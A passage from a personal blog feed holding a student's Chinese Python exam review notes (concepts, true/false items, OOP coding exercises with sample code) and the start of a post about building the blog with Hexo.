<li>同一个列表或元组中的大整数在内存中会保存一份</li>
<li>对于实数，不进行缓存。一样的实数，在内存中也不是一份</li>
<li>对于字符串，是否进行缓存，并不是单纯地看长度</li>
</ul>
<ol start="16">
<li><p>对于带有else子句的for循环和while循环，当循环因循环条件不成立而自然结束时会执行else中的代码</p>
</li>
<li><p>通过对象可以调用<strong>类方法</strong>和<strong>静态方法</strong></p>
</li>
<li><p>Python使用<strong>class</strong>关键字来定义类</p>
</li>
<li><p>在函数内部可以通过关键字<strong>global</strong>来定义全局变量</p>
</li>
<li><p>Python中，关于类中的构造函数 创建时自动调用</p>
</li>
<li><p>Python 函数返回值</p>
</li>
</ol>
<ul>
<li>函数体中 return 语句有指定返回值时返回的就是其值</li>
<li>函数体中没有 return 语句时，函数运行结束会隐含返回一个 None 作为返回值，类型是 NoneType，与 return 、return None 等效，都是返回 None</li>
</ul>
<ol start="22">
<li><p>在类的定义中，以两个下划线“__”开始（不以两个或者更多下划线结尾）定义的成员方法是<strong>私有</strong>方法</p>
</li>
<li><p>在Python中定义类时所有实例方法的第一个参数用来表示对象本身，在类的外部通过对象名来调用实例方法时不需要为该参数传值</p>
</li>
<li><p>通过类名修改类属性的值，会影响所有的实例化对象</p>
</li>
<li><p>自定义函数时，即使该函数不需要接收任何参数，也必须在函数名后保留一对空的圆括号来表示这是一个函数</p>
</li>
<li><p>Python 数据成员(属性)</p>
</li>
</ol>
<ul>
<li>属于对象的数据成员一般在构造方法__init__()中定义，当然也可以在其他成员方法中定义，在定义和在实例方法中访问数据成员时<strong>以self作为前缀</strong>，同一个类的不同对象（实例）的数据成员之间互不影响</li>
<li>属于类的数据成员是该类所有对象共享的，不属于任何一个对象，在定义类时这类数据成员一般不在任何一个成员方法的定义中</li>
</ul>
<ol start="27">
<li>Python函数的参数</li>
</ol>
<ul>
<li>位置参数(positional argument)<br>位置参数也称必须参数，位置参数须以从左到右的顺序传入函数。调用时的数量必须和声明时的一样</li>
<li>关键字参数(keyword argument)<br>在调用函数时，实参可以是key&#x3D;value的形式，称为关键字参数<br>可以不按照从左到右的顺序定义，但仍能为指定的形参赋值<br>关键字参数在位置参数后面。位置参数是必须先满足，才考虑其他可变参数<br>不可以对一个形参重复赋值</li>
<li>默认参数<br>默认参数必须在位置参数之后</li>
<li>不定长参数<br>当需要一个函数能处理比当初声明时更多的参数，则这些参数叫做不定长参数</li>
</ul>
<ol start="28">
<li><p>以读模式打开文件时，文件指针指向文件开始处</p>
</li>
<li><p>函数内部定义的局部变量当函数调用结束后被自动删除</p>
</li>
<li><p>语句<strong>pass</strong>仅起到占位符的作用，并不会做任何操作</p>
</li>
<li><p>Python支持在函数内部定义函数，此类函数又称为<strong>局部</strong>函数</p>
</li>
<li><p>python中的*(星号)</p>
</li>
</ol>
<ul>
<li>作为乘法运算符</li>
<li>收集列表中多余的值</li>
<li>函数中收集参数或者分配参数</li>
</ul>
<ol start="33">
<li><p>对文件进行读写操作之后必须显式关闭文件以确保所有内容都得到保存</p>
</li>
<li><p>python编程语言中，函数可以不包含 return 语句</p>
</li>
<li><p>在类中，采用@和关键字<strong>classmethod</strong>修饰的方法为类方法</p>
</li>
<li><p>Python内置函数<strong>open</strong>用来打开或创建文件并返回文件对象</p>
</li>
<li><p>类的数据成员，一种是<strong>类属性</strong>，另一种是<strong>实例</strong>属性</p>
</li>
<li><p>Python类方法和实例方法相似，它最少也要包含一个参数，只不过类方法中通常将其命名为<strong>cls</strong></p>
</li>
<li><p>Python 支持多继承，如果父类中有相同的方法名，而在子类中调用时没有指定父类名，则 Python 解释器将从左向右按顺序进行搜索</p>
</li>
<li><p>使用 pickle 进行序列化得到的二进制文件使用 struct <strong>不可以</strong>正确地进行反序列化</p>
</li>
<li><p>Python文件基本操作方法</p>
</li>
</ol>
<ul>
<li>open()  read()  write()  close()</li>
<li>readline() 一次读取一行</li>
<li>append()<strong>不是！</strong></li>
<li>详细：<a href="https://www.w3cschool.cn/article/25704283.html">Python文件基本操作整理</a></li>
</ul>
<ol start="42">
<li>Python文件打开的合法模式组合</li>
</ol>
<ul>
<li>r&#x2F;rt  默认模式，文本模式读</li>
<li>rb	二进制文件</li>
<li>w&#x2F;wt 	文本模式写，打开前文件存储被清空</li>
<li>wb    二进制写，文件存储同样被清空</li>
<li>a   	追加模式，只能写在文件末尾</li>
<li>a+  	可读写模式，写只能写在文件末尾</li>
<li>w+ 	可读写，与a+的区别是要清空文件内容</li>
<li>r+   	可读写，与a+的区别是可以写到文件任何位置</li>
</ul>
<ol start="43">
<li>Python成员方法</li>
</ol>
<ul>
<li>公有方法  默认都是公有的方法</li>
<li>私有方法  以两个下划线”__“开始声明私有方法</li>
<li>静态方法  使用staticmethod()方法声明静态方法</li>
<li>类方法    使用classmethod()方法声明类方法</li>
</ul>
<ol start="44">
<li><p>Python编程语言中，可以动态地为类和对象增加成员</p>
</li>
<li><p>为了提高Python代码运行速度和进行适当的保密，可以将Python程序文件编译为扩展名<strong>pyc</strong>的文件</p>
</li>
<li><p>可以使用内置函数**globals()**查看包含当前作用域内所有全局变量和值的字典</p>
</li>
<li><p>可以使用内置函数**locals()**查看包含当前作用域内所有局部变量和值的字典</p>
</li>
<li><p>字典对象的**get()**方法可以获取指定“键”对应的“值”，并且可以在指定“键”不存在的时候返回指定值，如果不指定则返回 None</p>
</li>
<li><p>字典对象的**items()**方法返回字典中的“键-值对”列表</p>
</li>
<li><p>Python 标准库 random 中的**choice()**方法作用是从序列中随机选择1个元素</p>
</li>
<li><p>Python 标准库 random 中的sample(seq, k)方法作用是从序列中选择<strong>不重复</strong>的k个元素</p>
</li>
<li><p>random模块中**shuffle()**方法的作用是将列表中的元素随机乱序</p>
</li>
<li><p>在设计正则表达式时，字符**?**紧随任何其他限定符(*、+、?、{n}、{n,}、{n,m})之后时，匹配模式是“非贪心的”，匹配搜索到的、尽可能短的字符串</p>
</li>
<li><p>在Python定义类时，与运算符“**”对应的特殊方法名为:</p>
</li>
</ol>
<p><code>__pow__()</code></p>
<ol start="55">
<li>在Python中定义类时，与运算符“&#x2F;&#x2F;”对应的特殊方法名为:</li>
</ol>
<p><code>__floordiv__()</code></p>
<ol start="56">
<li>在Python中，不论类的名字是什么，构造方法的名字都是:</li>
</ol>
<p><code>__init__()</code></p>
<ol start="57">
<li><p>如果在设计一个类时实现了__contains__()方法，那么该类的对象会自动支持<strong>in</strong>运算符</p>
</li>
<li><p>对文件进行写入操作之后，**flush()**方法用来在不关闭文件对象的情况下将缓冲区内容写入文件</p>
</li>
<li><p>Python标准库os中用来列出指定文件夹中的文件和子文件夹列表的方式是<strong>listdir()</strong></p>
</li>
<li><p>Python标准库<strong>hashlib</strong>中提供了计算MD5摘要的方法md5()</p>
</li>
</ol>
<h1 id="选填判断题"><a href="#选填判断题" class="headerlink" title="选填判断题"></a>选填判断题</h1><ol>
<li><p><code>x = &#123;1:1, 2:2&#125;</code>，之后执行<code>x.update(&#123;2:3, 3:3&#125;)</code>，则<code>sorted(x.items())</code>值为：<br>[(1, 1), (2, 3), (3, 3)]<br>解析：<br>执行update函数后，x&#x3D;{1: 1, 2: 3, 3: 3}<br>由于items()方法返回一个 view 对象。这个视图对象包含字典的键值对，形式为列表中的元组。<br>因此可得到该结果。</p>
</li>
<li><p>判断：正则表达式’^abc’只能匹配所有以’abc’开头的字符串<br>对</p>
</li>
<li><p>判断：表达式1&lt;2 or a&lt;b的值为异常报错，因为a,b没有被定义<br>错<br>解析：<br>运行后不会产生报错。因为是惰性求值，or语句的前半判断正确，后半则不会运算</p>
</li>
<li><p>在Python编程语言中，已知i&#x3D;4，++i的值为：<br>4<br>解析：<br>++i 表示先输出再作 + 运算</p>
</li>
<li><p>int(‘101’, 2)的值是：<br>5<br>解析：<br>int()的语法 <code>class int(x, base=10)</code><br>参数：x -- 字符串或数字  base -- 进制数，默认十进制<br>该题是将前面的字符串’101’当作二进制，转换成十进制即为5</p>
</li>
<li><p><code>x = [&#39;321&#39;, &#39;0234&#39;, &#39;9&#39;,&#39;99&#39;],max(x, key=len)</code>结果是：<br>‘0234’<br>解析：<br>max()函数是从中选出最大值，key&#x3D;len意思是按长度排序，因此结果’0234’</p>
</li>
<li><p>判断：已知 x &#x3D; ‘cuit’，那么赋值语句 x &#x3D; 3 由于赋值类型不一致，导致该语句是无法正常执行的<br>错<br>解析：<br>可以正常执行，能够赋值成功</p>
</li>
<li><p>已知<code>x = [[None] * 2] * 2</code>,那么<code>x[0][0]=1</code>后，x的值为：<br>[[1, None], [1, None]]<br>解析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x=[[None] * 2] </span><br></pre></td></tr></table></figure>
<p>值为[[None, None]]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x = [[None] * 2] * 2 </span><br></pre></td></tr></table></figure>
<p>值为[[None, None], [None, None]]<br>外面的 * 2 是完全复制，内存id相同，因此赋值时<code>x[0][0],x[1][0]</code>均为1<br>内部的 * 2 是部分复制，内存id不同，因此赋值时<code>x[0][1],x[1][1]</code>仍然是None</p>
</li>
<li><p>表达式’a,,,bb,,ccc’.split(‘,’)的运行结果是：<br>[‘a’, ‘’, ‘’, ‘bb’, ‘’, ‘ccc’]<br>解析：<br>按照’,’切分字符串，由于该字符串两个’,’之间为空，所以最终会得到’’的字符串</p>
</li>
<li><p>已知 x 为非空字符串，那么表达式 <code>&#39;,&#39;.join(x.split(&#39;,&#39;)) == x</code> 的值一定为 True<br>对</p>
</li>
<li><p>语句<code>x.append(3)</code>和<code>x = x+[3]</code>，都是原地修改列表x,在列表x尾部添加元素3<br>错<br>解析：<br>append()函数是在列表尾部添加元素3，<code>x = x+[3]</code>是重新创建一个列表，把元素3添加进去，再赋值给x</p>
</li>
<li><p>表达式<code>&#123;1, 2, 3, 4, 5, 6&#125; ^ &#123;5, 6, 7, 8&#125;</code>的值为:<br>{1, 2, 3, 4, 7, 8}<br>解析：<br>集合运算符号’^’是剔除两个集合相同元素后得到新集合。<br>更多集合运算知识：<a href="https://www.runoob.com/python3/python3-set.html">Python3 集合</a></p>
</li>
<li><p>str((1,2,3))的返回值是:<br>‘(1,2,3)’<br>解析：<br>不要忘加外面的引号，单引双引皆可</p>
</li>
<li><p>正则表达式r’p*‘表示允许匹配多个(至少1个)p<br>错<br>解析：<br>*表示匹配前⼀个字符出现0次或者⽆限次，即可有可⽆</p>
</li>
<li><p>对象<code>x=（1,2,3)</code>,语句<code>x[0]=10</code>，表示修改对象x第一个元素的值<br>错<br>解析：<br>元组对象不支持元素修改，因为是不可变类型</p>
</li>
<li><p>表达式 [] &#x3D;&#x3D; None 的值为 True<br>错<br>解析<br>值为False。 None表示空，但它不等于空字符串、空列表，也不等同于False</p>
</li>
<li><p>“aassadfddff”.strip(“af”)的结果是：<br>ssadfdd<br>解析：<br>该正则表达式strip意为将前面字符串首尾包含括号内字符的切掉。<br>如果是lstrip 切掉左边的<br>如果是rstrip 切掉右边的</p>
</li>
<li><p>已知<code>x = [300, 300, 300]，x[0] is x[1]</code>的值为True<br>对<br>解析：<br>is运算符判断两者id是否相同。本题中，同一列表中值相同的元素id相同</p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="built_in">input</span>(<span class="string">&#x27;input ten number:&#x27;</span>)<span class="comment">#输入的分别是3 4 2 3 17 4 21 18 19 22</span></span><br><span class="line">a_list = <span class="built_in">list</span>(<span class="built_in">map</span>( <span class="keyword">lambda</span> x:<span class="built_in">int</span>(x),x.split(<span class="string">&#x27; &#x27;</span>))<span class="comment">#期望 a_lis为: [3,4,2,3,17,4,21,18,19,22]；注意上一行x中有空格</span></span><br><span class="line"><span class="built_in">print</span>(a_list[-<span class="number">6</span>:-<span class="number">1</span>])<span class="comment">#期望输出[4,21,18,19,22]</span></span><br><span class="line"><span class="built_in">print</span>(a_list.remove(<span class="number">3</span>))<span class="comment">#期望输出[4,2,3,17,4,21,18,19,22]</span></span><br><span class="line"><span class="built_in">print</span>( <span class="built_in">len</span>(a_list))<span class="comment">#期望显示a___list元素个数</span></span><br></pre></td></tr></table></figure>
<p>解析：<br>输入时是字符串，因此需要用<code>int / lambda x:int(x)</code>转化为整型，用<code>x. split(&#39; &#39;)</code>将输入时间隔的空格去掉<br>采用切片操作[-6:-1],意思是从列表的倒数第6个开始，一直到倒数第1个<br>remove()函数从列表中移除括号内的数字，从左到右第一个会被移除<br>len()输出列表长度</p>
</li>
<li><p>已知函数定义 <code>def func(**p):return &#39;&#39;.join(sorted(p))</code>，那么表达式<code>func(x=1, y=2, z=3)</code>的值是:<br>‘xyz’<br>解析：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   &#123;&#x27;x&#x27;: 1, &#x27;y&#x27;: 2, &#x27;z&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(p)</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   [&#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">sorted</span>(p))</span><br><span class="line"><span class="built_in">print</span>(func(x=<span class="number">1</span>, y=<span class="number">2</span>, z=<span class="number">3</span>))</span><br><span class="line"><span class="comment">#   &#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>:</span><br><span class="line">    price = <span class="number">1000</span>                     </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, c</span>):</span><br><span class="line">        self.color = c                 </span><br><span class="line">car1 = Car(<span class="string">&quot;Red&quot;</span>)                      </span><br><span class="line">car2 = Car(<span class="string">&quot;Blue&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(car1.color)</span><br><span class="line"><span class="built_in">print</span>(Car.price)</span><br><span class="line">Car.price = <span class="number">1100</span>                     </span><br><span class="line">Car.name = <span class="string">&#x27;QQ&#x27;</span>                        </span><br><span class="line">car1.color = <span class="string">&quot;Yellow&quot;</span>                  </span><br><span class="line"><span class="built_in">print</span>(car2.name)</span><br><span class="line"><span class="built_in">print</span>(Car.price)</span><br><span class="line"><span class="built_in">print</span>(car1.color)</span><br></pre></td></tr></table></figure>
<p>阅读上面程序，按顺序写出该程序的运行结果:<br><u>Red</u> <u>1000</u> <u>QQ</u> <u>1100</u> <u>Yellow</u></p>
</li>
<li><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Test</span>(<span class="params">*p</span>):</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">调用该函数Test(<span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>), 输出正确的是：</span><br><span class="line"><span class="comment"># (3,5,8)</span></span><br></pre></td></tr></table></figure>
<p>解析：<br>有多个元素一次性输出，以元组形式输出</p>
</li>
<li><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Sum0</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([a, b, c])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sum1</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>((a,b,c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sum2</span>(<span class="params">a, b=<span class="number">3</span>, c=<span class="number">5</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>([a, b, c])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">*p</span>):</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(Sum0(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum1(c=<span class="number">8</span>,a=<span class="number">9</span>,b=<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum2(a=<span class="number">8</span>, c=<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(Sum2(<span class="number">8</span>))</span><br><span class="line">demo(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>阅读上面的程序，按顺序写出该程序运行结果<br><u>6</u> <u>[9,10,8]</u> <u>13</u> <u>16</u> <u>(1,2)</u></p>
</li>
<li><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sorted([&#x27;bbc&#x27;,&#x27;abc&#x27;,&#x27;bcd&#x27;,&#x27;acd&#x27;], key=lambda x:(x[0],x[2]))</span><br></pre></td></tr></table></figure>
<p>值为：<br>[‘abc’,’acd’,’bbc’,’bcd’]<br>解析：<br>sorted按照字符大小排序</p>
</li>
</ol>
<h1 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h1><p>1.<br><strong>描述</strong><br>牛牛的Python老师为了更好地管理班级，利用一个类Student来管理学生，这个类包含了学生姓名（str）、学号（str）、分数（int）、每次作业等级（list[str]）等信息。请你帮助牛牛的老师实现这样一个类，并定义构造方法实现初始化，定义打印函数实现打印学生的姓名、学号、分数、提交作业的次数、每次作业的等级。<br><strong>输入描述：</strong><br>第一行输入字符串表示学生姓名。<br>第二行输入字符串表示学生学号。<br>第三行输入整数表示学生得分。<br>第四行输入多个大写字母表示每次作业等级，用空格间隔。<br><strong>输出描述：</strong><br>用一句话输出学生的姓名、学号、分数、提交作业的次数、每次作业的等级，可以参考输出样例。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>12345<br>90<br>A B C<br><strong>输出：</strong><br>NiuNiu’s student number is 12345, and his grade is 90. He submitted 3 assignments, each with a grade of A B C<br>题目来源：牛客网</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,stu_num,score,level</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.stu_num = stu_num</span><br><span class="line">        self.score = score</span><br><span class="line">        self.level = level</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;self.name&#125;</span>\&#x27;s student number is <span class="subst">&#123;self.stu_num&#125;</span>, and his grade is <span class="subst">&#123;self.score&#125;</span>. He submitted <span class="subst">&#123;<span class="built_in">len</span>(self.level)&#125;</span> assignments, each with a grade of <span class="subst">&#123;<span class="string">&quot; &quot;</span>.join(self.level)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">stu_num = <span class="built_in">input</span>()</span><br><span class="line">score = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">level = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">input</span>().strip().split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line">Stu1 = Student(name,stu_num,score,level)</span><br><span class="line">Stu1.p()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.<br><strong>描述</strong><br>请为牛客网的员工创建一个Employee类，包括属性有姓名（name）、（salary），并设置初始化。同时该类包括一个方法printclass，用于输出类似’NiuNiu‘s salary is 4000, and his age is 22’的语句。<br>请根据输入的name与salary为该类创建实例e，并调用printclass方法输出信息，如果没有年龄信息则输出错误信息”Error! No age”。<br>根据输入的年龄为实例e直接添加属性age等于输入值，再次调用printclass方法输出信息。（printclass方法中建议使用try…except…结构）<br><strong>输入描述：</strong><br>三行分别输入姓名name、工资salary、年龄age，其中第一个为字符串，后两个为整型数字。<br><strong>输出描述：</strong><br>根据描述输出错误信息或是打印信息。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>8000<br>22<br><strong>输出：</strong><br>Error! No age<br>NiuNiu’s salary is 8000, and his age is 22<br>题目来源：牛客网</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, salary</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.salary = salary</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printclass</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s salary is <span class="subst">&#123;self.salary&#125;</span>, and his age is <span class="subst">&#123;self.age&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">salary = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">e = Employee(name,salary)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    e.printclass()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error! No age&quot;</span>)</span><br><span class="line">    e.age = age</span><br><span class="line">    e.printclass()</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>描述</strong><br>请为牛客网的员工创建一个Employee类，包括属性有姓名（name）、（salary），并设置初始化。同时该类包括一个方法printclass，用于输出类似’NiuNiu‘s salary is 4000, and his age is 22’的语句。<br>请根据输入的信息为Employee类创建一个实例e，调用hasattr方法检验实例有没有属性age，如果存在属性age直接调用printclass输出，否则使用setattr函数为其添加属性age，并设置值为输入后，再调用printclass输出。<br><strong>输入描述：</strong><br>三行分别依次输入姓名name、工资salary、年龄age，其中第一行为字符串，后两行为整型数字。<br><strong>输出描述：</strong><br>第一行输出e有没有属性age，True或者False；<br>第二行输出printclass打印信息。<br>示例1<br><strong>输入：</strong><br>NiuNiu<br>4000<br>23<br><strong>输出：</strong><br>False<br>NiuNiu’s salary is 4000, and his age is 23<br>题目来源：牛客网</li>
</ol>
<p><strong>示例代码：</strong></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, salary</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.salary = salary</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">printclass</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span>&#x27;s salary is <span class="subst">&#123;self.salary&#125;</span>, and his age is <span class="subst">&#123;self.age&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error! No age&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>()</span><br><span class="line">salary = <span class="built_in">input</span>()</span><br><span class="line">age = <span class="built_in">input</span>()</span><br><span class="line">e = Employee(name, salary)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">print</span>(<span class="built_in">hasattr</span>(e, <span class="string">&#x27;age&#x27;</span>)):</span><br><span class="line">    e.printclass()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">setattr</span>(e,<span class="string">&quot;age&quot;</span>,age)</span><br><span class="line">    e.printclass()</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>面向对象编程参考习题：<br><a href="https://www.cnblogs.com/plf-Jack/p/11054248.html#:~:text=python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E4%B9%8B%E7%BB%83%E4%B9%A0%E9%A2%981%201%20%E5%AE%9A%E4%B9%89%E7%AE%A1%E7%90%86%E5%91%98%E7%B1%BB%EF%BC%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%88%9B%E5%BB%BA%E5%AD%A6%E6%A0%A1%E3%80%81%E5%88%9B%E5%BB%BA%E8%AF%BE%E7%A8%8B%E3%80%81%E5%88%9B%E5%BB%BA%E8%80%81%E5%B8%88%202%20%E5%AE%9A%E4%B9%89%E8%80%81%E5%B8%88%E7%B1%BB%EF%BC%8C%E8%80%81%E5%B8%88%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E8%AF%BE%E7%A8%8B%E3%80%81%E7%BB%99%E5%AD%A6%E7%94%9F%E6%89%93%E5%88%86%2C%E4%BD%86%E5%8F%91%E7%8E%B0%E5%AD%A6%E7%94%9F%E6%B2%A1%E6%9C%89%E8%B4%AD%E4%B9%B0%E8%AF%BE%E7%A8%8B%E6%97%B6%EF%BC%8C%E4%B8%8D%E8%83%BD%E6%89%93%E5%88%86%EF%BC%8C%E5%B9%B6%E7%BB%99%E5%87%BA%E6%8F%90%E7%A4%BA%203,%28name%2Cpassword%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E5%AD%A6%E6%A0%A1%E3%80%81%E9%80%89%E6%8B%A9%E5%AD%A6%E6%A0%A1%E3%80%81%E9%80%89%E6%8B%A9%E8%AF%BE%E7%A8%8B%EF%BC%8C%E4%BD%86%E5%AD%A6%E6%A0%A1%E6%B2%A1%E6%9C%89%E8%AF%A5%E8%AF%BE%E7%A8%8B%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8F%90%E7%A4%BA%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%B8%8D%E8%83%BD%E9%80%89%E6%8B%A9%E8%AF%A5%E8%AF%BE%E7%A8%8B%204%20%E5%AE%9A%E4%B9%89%E5%AD%A6%E6%A0%A1%E7%B1%BB%EF%BC%8C%E5%AD%A6%E6%A0%A1%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%2Caddr%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E8%AF%BE%E7%A8%8B%205%20%E5%AE%9A%E4%B9%89%E8%AF%BE%E7%A8%8B%E7%B1%BB%EF%BC%8C%E8%AF%BE%E7%A8%8B%E6%9C%89%E5%B1%9E%E6%80%A7%20%28name%29%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E5%AD%A6%E7%94%9F%20">python面向对象之练习题1</a><br><a href="https://blog.csdn.net/qq_44034384/article/details/107600403">Python面向对象练习题汇总</a></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>就写到这里了，虽然不算写得很好，但还是有模有样吧<br>希望Python期末能考高分！</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>First Blog</title>
    <url>/2022/11/03/first_blog/</url>
    <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次搭建博客是我第一次搭建，总共花费了我两天两夜，过程很煎熬，遇到了不少挫折，不过还是很值得，我对此毫不后悔。</p>
<h1 id="想法萌芽"><a href="#想法萌芽" class="headerlink" title="想法萌芽"></a>想法萌芽</h1><p>搭建这个博客是因为想到要开始学web安全的技术，有很多知识点需要记录查阅。于是在网上查，看到了一篇名叫<a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a>的文章，正是因为看到了这篇文章我才知道搭建博客并没有我想象中那么难。从而开始了博客之旅。</p>
<h1 id="所需能力"><a href="#所需能力" class="headerlink" title="所需能力"></a>所需能力</h1><p>搭完博客后，我认为如果只是想搭一个普通的博客，其中的技术含量并没有多少。困难之处通常是因为网上的文章过时或是与自己的配置不和而导致的出错等。唯一需要的是耐心与查阅资料的能力。<br><del>在搭建博客期间最擅长的代码</del>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>

<h1 id="关于域名"><a href="#关于域名" class="headerlink" title="关于域名"></a>关于域名</h1><p>本来想买域名的，但我重新审视了自己的内心之后，发现其实买域名只是为了满足自己的虚荣心。在现阶段根本不需要域名。于是最终放弃了购买域名。我想，等我发表了10篇<strong>有点内容</strong>的博客后我再购买域名吧。</p>
<h1 id="挫折点"><a href="#挫折点" class="headerlink" title="挫折点"></a>挫折点</h1><ol>
